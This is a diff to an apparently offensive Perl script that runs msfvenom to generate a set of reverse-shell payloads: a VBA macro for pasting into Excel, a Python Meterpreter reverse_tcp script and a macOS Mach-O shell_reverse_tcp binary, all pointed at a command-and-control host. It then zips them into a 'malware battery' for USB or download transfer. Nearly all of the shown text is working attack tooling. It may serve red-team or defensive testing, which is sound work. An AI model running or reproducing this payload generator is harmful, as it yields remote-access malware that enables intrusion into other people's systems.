@@ -117,7 +117,7 @@ use warnings;
   print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
- ###################
+  ###################
   ##
   ##  64bit Delivery + Encoding
   ##
@@ -168,6 +168,56 @@ use warnings;
 
   `touch $targetFolder/300-Stalwart-run960.cue`;
   `touch $targetFolder/300-Stalwart-run965.cue`;
+
+
+  ###################
+  ##
+  ##  Python
+  ##
+  ##################
+ 
+ `touch $targetFolder/400-Stalwart-run970.cue`;
+
+  $platform_arch = "--platform Python -a python";
+  $encoder = "-e generic/none";
+  $payload = "-p python/meterpreter/reverse_tcp";
+  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} $encoder > $targetFolder/401-Stalwart-Meterpreter-python.py";
+  print "\n\n*** Meterpreter python: $cmd\n";
+  `$cmd`;
+  #original: msfvenom -e generic/none --platform Python -a python -p python/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=443 >400-Stalwart-Python.py
+
+
+
+  ###################
+  ##
+  ##  MAC
+  ##
+  ##################
+
+ `touch $targetFolder/500-Stalwart-run975.cue`;
+
+  $platform_arch = "--platform OSX -a x86";
+  $encoder = "-e generic/none";
+  $payload = "-p osx/x86/shell_reverse_tcp";
+  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f macho $encoder > $targetFolder/501-Stalwart-shell.macho";
+  print "\n\n*** Meterpreter mac: $cmd\n";
+  `$cmd`;
+
+
+
+
+
+
+  ###################
+  ##
+  ##  zip it up for USB/Download fast transfer
+  ##
+  ##################
+  `zip -r $targetFolder/999-Stalwart-Malware-CurrentBattery.zip $targetFolder/*`;
+
+
+
+
  
 #Needs additional work
 #  print "\n\n*** Meterpreter Java  (Paste into Java and compile) \n";
